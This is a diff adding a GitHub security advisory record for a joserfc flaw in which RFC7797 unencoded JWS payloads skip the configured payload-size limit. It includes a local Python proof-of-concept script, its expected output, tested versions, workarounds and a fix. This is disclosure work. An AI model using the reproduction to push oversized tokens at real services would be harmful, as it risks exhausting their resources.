@@ -1,0 +1,68 @@
+{
+  "id": "GHSA-wphv-vfrh-23q5",
+  "modified": "2026-06-26T21:15:09.791148773Z",
+  "published": "2026-06-26T20:59:38Z",
+  "aliases": [
+    "CVE-2026-48990"
+  ],
+  "summary": "joserfc: b64=false RFC7797 JWS payloads bypass JWSRegistry payload-size limits during deserialization",
+  "details": "# RFC7797 b64=false JWS payloads bypass JWSRegistry payload-size limits during deserialization\n\n## Summary\n\nTesting revealed that `joserfc` accepts oversized RFC7797 `b64=false` JWS payloads without applying `JWSRegistry.max_payload_length`.\n\nThe normal JWS compact and flattened JSON paths reject payloads above the configured payload-size limit with `ExceededSizeError`. The RFC7797 unencoded payload paths do not make the same check. A valid `b64=false` compact or flattened JSON JWS can therefore deserialize successfully with a payload larger than `JWSRegistry.max_payload_length`.\n\nThis creates a moderate availability/resource-exhaustion risk for applications that accept lower-trust JWS values and rely on `joserfc` to reject oversized token content during verification.\n\n## Affected Product\n\n- Package: `joserfc`\n- Ecosystem: `pip`\n- Audited release: `1.6.5`\n- Audit tag: `1.6.5`\n- Audit commit: `881712980934fb601bed26fe3ae1ec0b7780e6f7`\n- Tested affected releases: `1.3.4`, `1.3.5`, `1.4.2`, `1.6.2`, `1.6.3`, `1.6.4`, `1.6.5`\n- Fixed release: none known\n\n## Vulnerability Details\n\nIn `joserfc` 1.6.5, the default JWS registry has `max_payload_length = 128000` and exposes `validate_payload_size()`.\n\nThe normal compact extraction path calls that check before base64url-decoding the payload. The RFC7797 compact path validates the header and signature segment sizes, then assigns the unencoded payload directly:\n\n```text\nif is_rfc7797_enabled(protected):\n    if not payload_segment and payload:\n        payload_segment = to_bytes(payload)\n    payload = payload_segment\n```\n\nThe flattened JSON RFC7797 path has the same pattern:\n\n```text\npayload_segment = value[\"payload\"].encode(\"utf-8\")\nif is_rfc7797_enabled(member.headers()):\n    payload = payload_segment\n```\n\nNeither branch calls `registry.validate_payload_size(payload_segment)` before accepting the unencoded payload.\n\n## Reproduction\n\nThe proof below uses only local Python APIs. It signs a payload one byte over the default limit and then compares normal JWS behavior with RFC7797 `b64=false` behavior.\n\nRequirements:\n\n```bash\npython -m pip install \"joserfc==1.6.5\"\n```\n\nRun:\n\n```bash\npython joserfc_rfc7797_size_bypass_poc.py\n```\n\nSelf-contained proof script:\n\n```python\n#!/usr/bin/env python3\nimport json\n\nimport joserfc\nfrom joserfc import jws\nfrom joserfc.jwk import OctKey\n\n\ndef check_compact(name, header, payload, key):\n    token = jws.serialize_compact(header, payload, key)\n    try:\n        obj = jws.deserialize_compact(token, key)\n        return {\n            \"case\": name,\n            \"accepted\": True,\n            \"exception\": None,\n            \"payload_len_after_deserialize\": len(obj.payload),\n        }\n    except Exception as exc:\n        return {\n            \"case\": name,\n            \"accepted\": False,\n            \"exception\": type(exc).__name__,\n            \"error\": str(exc),\n        }\n\n\ndef check_json(name, protected, payload, key):\n    data = jws.serialize_json({\"protected\": protected}, payload, key)\n    try:\n        obj = jws.deserialize_json(data, key)\n        return {\n            \"case\": name,\n            \"accepted\": True,\n            \"exception\": None,\n            \"payload_len_after_deserialize\": len(obj.payload),\n        }\n    except Exception as exc:\n        return {\n            \"case\": name,\n            \"accepted\": False,\n            \"exception\": type(exc).__name__,\n            \"error\": str(exc),\n        }\n\n\nkey = OctKey.import_key(\"secret-secret-secret\")\nlimit = jws.default_registry.max_payload_length\npayload = \"A\" * (limit + 1)\n\nresults = {\n    \"joserfc_version\": joserfc.__version__,\n    \"default_max_payload_length\": limit,\n    \"payload_len\": len(payload),\n    \"compact\": [\n        check_compact(\"normal_b64_true\", {\"alg\": \"HS256\"}, payload, key),\n        check_compact(\n            \"rfc7797_b64_false\",\n            {\"alg\": \"HS256\", \"b64\": False, \"crit\": [\"b64\"]},\n            payload,\n            key,\n        ),\n    ],\n    \"json\": [\n        check_json(\"normal_b64_true_json\", {\"alg\": \"HS256\"}, payload, key),\n        check_json(\n            \"rfc7797_b64_false_json\",\n            {\"alg\": \"HS256\", \"b64\": False, \"crit\": [\"b64\"]},\n            payload,\n            key,\n        ),\n    ],\n}\nprint(json.dumps(results, indent=2, sort_keys=True))\n```\n\nExpected output on `1.6.5` includes:\n\n```json\n{\n  \"default_max_payload_length\": 128000,\n  \"payload_len\": 128001,\n  \"compact\": [\n    {\n      \"case\": \"normal_b64_true\",\n      \"accepted\": false,\n      \"exception\": \"ExceededSizeError\"\n    },\n    {\n      \"case\": \"rfc7797_b64_false\",\n      \"accepted\": true,\n      \"exception\": null,\n      \"payload_len_after_deserialize\": 128001\n    }\n  ],\n  \"json\": [\n    {\n      \"case\": \"normal_b64_true_json\",\n      \"accepted\": false,\n      \"exception\": \"ExceededSizeError\"\n    },\n    {\n      \"case\": \"rfc7797_b64_false_json\",\n      \"accepted\": true,\n      \"exception\": null,\n      \"payload_len_after_deserialize\": 128001\n    }\n  ]\n}\n```\n\n## Version Checks\n\nI reproduced the same differential behavior on these releases:\n\n| Version | Normal JWS over limit | RFC7797 `b64=false` over limit |\n| --- | --- | --- |\n| 1.3.4 | `ExceededSizeError` | accepted |\n| 1.3.5 | `ExceededSizeError` | accepted |\n| 1.4.2 | `ExceededSizeError` | accepted |\n| 1.6.2 | `ExceededSizeError` | accepted |\n| 1.6.3 | `ExceededSizeError` | accepted |\n| 1.6.4 | `ExceededSizeError` | accepted |\n| 1.6.5 | `ExceededSizeError` | accepted |\n\nThe exact earliest affected release may be broader. The versions above are the releases I directly tested where the JWS size-limit boundary exists and the RFC7797 path bypasses it.\n\n## Relationship to Existing Advisories\n\nI found two related public advisories for `joserfc`, but neither appears to cover this root cause.\n\n`GHSA-frfh-8v73-gjg4` / `CVE-2025-65015` describes oversized token parts being included in `ExceededSizeError` messages in older release ranges. The issue described here reproduces in `1.6.5` and is not about exception message content. The oversized RFC7797 payload is accepted instead of raising `ExceededSizeError`.\n\n`GHSA-w5r5-m38g-f9f9` / `CVE-2026-27932` describes unbounded PBES2 `p2c` iteration counts during JWE decryption. The issue described here is in JWS RFC7797 payload extraction and does not involve PBES2 or JWE decryption.\n\n## Workarounds\n\nBefore a fixed release is available, affected applications can reduce exposure by rejecting oversized serialized JWS inputs before passing them to `joserfc`, disabling or disallowing RFC7797 `b64=false` tokens if not needed, and enforcing strict request/header/body size limits at the application or reverse-proxy layer.\n\n## Suggested Remediation\n\nApply `registry.validate_payload_size(payload_segment)` to RFC7797 unencoded payloads before assigning them to the JWS object in both compact and flattened JSON extraction paths. Detached RFC7797 compact payloads supplied through the `payload` argument should be checked in the same way.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "joserfc",
+        "purl": "pkg:pypi/joserfc"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.3.4"
+            },
+            {
+              "fixed": "1.6.7"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.3.4",
+        "1.3.5",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.4.3",
+        "1.5.0",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.6.5"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wphv-vfrh-23q5/GHSA-wphv-vfrh-23q5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/joserfc/security/advisories/GHSA-wphv-vfrh-23q5"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48990"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/authlib/joserfc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/joserfc/releases/tag/1.6.7"
+    }
+  ]
+}
